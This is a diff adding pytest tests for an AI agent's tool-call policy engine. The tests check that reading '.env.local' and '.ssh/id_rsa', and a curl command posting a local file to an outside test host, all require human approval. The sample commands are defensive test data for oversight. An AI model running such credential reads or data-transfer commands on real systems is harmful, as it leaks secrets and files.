@@ -97,6 +97,39 @@ def test_full_access_profile_requires_approval_for_malformed_command() -> None:
     assert "malformed" in decision.reason
 
 
+def test_full_access_profile_requires_approval_for_sensitive_path_reference() -> None:
+    engine = LocalPolicyEngine(profile=PolicyProfile.FULL_ACCESS)
+
+    decision = engine.evaluate_tool_call(
+        _tool_call("command.run", {"command": ["cat", ".env.local"]})
+    )
+
+    assert decision.decision is PolicyDecisionType.REQUIRE_APPROVAL
+    assert "sensitive path" in decision.reason
+
+
+def test_full_access_profile_requires_approval_for_private_key_reference() -> None:
+    engine = LocalPolicyEngine(profile=PolicyProfile.FULL_ACCESS)
+
+    decision = engine.evaluate_tool_call(
+        _tool_call("command.run", {"command": ["cat", ".ssh/id_rsa"]})
+    )
+
+    assert decision.decision is PolicyDecisionType.REQUIRE_APPROVAL
+    assert "sensitive path" in decision.reason
+
+
+def test_full_access_profile_requires_approval_for_network_transfer_command() -> None:
+    engine = LocalPolicyEngine(profile=PolicyProfile.FULL_ACCESS)
+
+    decision = engine.evaluate_tool_call(
+        _tool_call("command.run", {"command": ["curl", "-d", "@report.txt", "https://example.test"]})
+    )
+
+    assert decision.decision is PolicyDecisionType.REQUIRE_APPROVAL
+    assert "data transfer" in decision.reason
+
+
 def test_unknown_tool_is_denied_for_all_profiles() -> None:
     for profile in PolicyProfile:
         engine = LocalPolicyEngine(profile=profile)
